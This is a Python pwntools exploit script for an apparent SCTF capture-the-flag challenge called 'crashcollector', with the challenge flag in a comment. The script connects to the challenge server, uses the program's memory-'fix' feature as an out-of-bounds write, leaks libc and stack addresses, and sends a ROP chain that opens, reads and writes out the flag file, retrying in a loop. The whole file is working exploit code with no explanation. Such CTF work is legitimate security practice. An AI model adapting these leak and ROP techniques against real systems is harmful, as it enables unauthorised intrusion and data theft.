from pwn import *
# flag : SCTF{Thanks_For_4ll_Your_Cr4sh3S}
while True:
  try:
    HOST = "crashcollector.eatpwnnosleep.com"
    PORT = 7778
    REMOTE = 1
    if(REMOTE):
      s = remote(HOST,7778)
    else:
      s = remote('192.168.33.10',PORT)

    s.recvuntil('sentence?')
    s.sendline('\x00'+"A"*98)
    def add(dat):
            s.recvuntil('idx?')
            s.sendline('1')
            s.recvuntil('add?')
            s.sendline(dat)
    add("A"*0xc)
    s.recvuntil('send crash report to server?')
    s.sendline('N')
    s.recvuntil('what about fixing the program by your self?')
    s.sendline('Y')
    s.recvuntil('where do you wan\'t to fix?')
    s.sendline(str(-0x148-6))
    s.recvuntil('change memory for the fix?')
    s.sendline(hex(0x3EEC<<48)+"y")
    print [s.recv()]
    s.recvuntil('what about fixing the program by your self?')
    s.sendline('y')
    s.recvuntil('where do you wan\'t to fix?')
    s.sendline(str(-0x148-6))
    s.recvuntil('change memory for the fix?')
    s.sendline(hex(0x4009<<48)+"y")
    s.recvuntil('RIP:')
    
    libc = int(s.recv(2*6),16)- 0x3c6790
    print "LIBC : ", hex(libc)
    s.recvuntil('RBX:')
    stack = int(s.recv(2*6),16)
    print "STACK : ", hex(stack)

    s.recvuntil('what about fixing the program by your self?')
    s.sendline('y')
    s.recvuntil('where do you wan\'t to fix?')
    s.sendline(str(-0x148))
    s.recvuntil('change memory for the fix?')
    gadget1 = 0x00000000000202e8 # pop rsi ; ret
    gadget2 = 0x0000000000021102 # pop rdi ; ret
    gadget3 = 0x00000000000ea69a # pop rcx ; pop rbx ; ret
    gadget4 = 0x0000000000086b38 # mov edi, eax ; pop rbx ; pop rbp ; pop r12 ; jmp rcx
    gadget5 = 0x0000000000001b92 # pop rdx ; ret
    dat = ""
    dat += p64(libc+gadget1)
    dat += p64(0) # mode
    dat += p64(libc+gadget2)
    dat += p64(stack+1)
    dat += p64(libc+0x0F7030) #open
    dat += p64(libc+gadget1)
    dat += p64(stack+0x600)
    dat += p64(libc+gadget3)
    dat += p64(libc+gadget3)
    dat += p64(0xdeadbeef)
    dat += p64(libc+gadget4)
    dat += p64(0xdeadbeef)*3
    dat += p64(0x20)
    dat += p64(0xdeadbeef)
    dat += p64(libc+gadget5)
    dat += p64(0x30)
    dat += p64(libc+0x0F7250) # read
    dat += p64(libc+gadget2)
    dat += p64(0x1)
    dat += p64(libc+gadget1)
    dat += p64(stack+0x600)
    dat += p64(libc+gadget3)
    dat += p64(0x20)*2
    dat += p64(libc+gadget5)
    dat += p64(0x30)
    dat += p64(libc+0x0F72B0) # write
    dat += p64(0xdeaddead)
    s.sendline(hex(libc+0x6ed80)+"\x00"+"./flag\00\x00"+"A"*(0x51f-0x88)+dat)
    print [s.recv()]
    print [s.recv(0x30)]
    break;
  except:
    s.close()
    continue
s.interactive()
